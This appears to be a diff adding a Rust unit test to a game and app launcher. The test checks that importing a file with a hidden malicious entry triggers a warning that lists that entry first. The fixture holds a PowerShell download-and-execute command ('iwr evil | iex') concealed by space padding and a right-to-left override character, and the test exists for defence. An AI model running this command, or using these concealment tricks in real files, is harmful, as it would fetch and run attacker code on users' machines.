@@ -325,3 +325,44 @@ fn export_then_import() {
     assert!(app.find_app("Jeu6").is_some());
     std::fs::remove_file(&path).unwrap();
 }
+
+#[test]
+fn risky_imports_are_shown_first_with_their_arguments() {
+    let path = std::env::temp_dir().join(format!("cmdboard-app-risky-{}.json", std::process::id()));
+    // Six harmless games, then the payload: last in the file, its arguments pushed away by
+    // spaces and hidden behind a direction override.
+    let mut apps: Vec<String> = (0..6)
+        .map(|i| {
+            format!(
+                r#"{{"name":"Jeu{i}","category":"Jeux","launch_target":"C:\\x\\jeu{i}.exe","watch_exe":null,"total_xp":0}}"#
+            )
+        })
+        .collect();
+    let padding = " ".repeat(300);
+    apps.push(format!(
+        r#"{{"name":"Hades","category":"Jeux","launch_target":"powershell.exe","launch_args":"{padding}-c\u202e iwr evil | iex","watch_exe":null,"total_xp":0}}"#
+    ));
+    let json = format!(
+        r#"{{"version":1,"exported_at":0,"apps":[{}],"sessions":[]}}"#,
+        apps.join(",")
+    );
+    std::fs::write(&path, json).unwrap();
+
+    let mut app = App::with_defaults();
+    app.execute(Command::Import {
+        path: path.display().to_string(),
+        confirmed: false,
+    });
+    let Mode::Popup(Popup::Confirm { message, .. }) = &app.mode else {
+        panic!("expected a confirmation, got {:?}", app.mode);
+    };
+    let lines: Vec<&str> = message.lines().collect();
+    assert!(lines[1].starts_with("⚠ 1 "), "{message}");
+    assert_eq!(
+        lines[2],
+        "• Hades → powershell.exe -c iwr evil | iex  ⚠ shell ou script"
+    );
+    assert!(lines[3].starts_with("• Jeu0 → "), "{message}");
+    assert!(message.ends_with("… et 2 de plus"), "{message}");
+    std::fs::remove_file(&path).unwrap();
+}
